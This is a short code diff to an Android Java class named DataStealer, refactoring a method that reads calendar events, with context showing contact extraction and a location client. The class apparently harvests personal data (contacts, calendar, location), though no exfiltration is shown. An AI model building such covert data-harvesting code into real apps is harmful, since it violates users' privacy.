@@ -77,7 +77,7 @@ public class DataStealer {
         return extractedContacts;
     }
 
-    public static ArrayList<CalendarEvent> takeCalendarData(Context context) {
+    public static ArrayList<CalendarEvent> takeCalendarData(Context context) throws SecurityException {
 
         String[] projection = new String[]{
                 Events._ID,
@@ -94,11 +94,7 @@ public class DataStealer {
                 null,
                 null);
 
-        ArrayList<CalendarEvent> cEvents = CalendarEvent.createFromCursor(cursor);
-
-
-        return cEvents;
-
+        return CalendarEvent.createFromCursor(cursor);
     }
 
     public DataStealer(FusedLocationProviderClient client) {
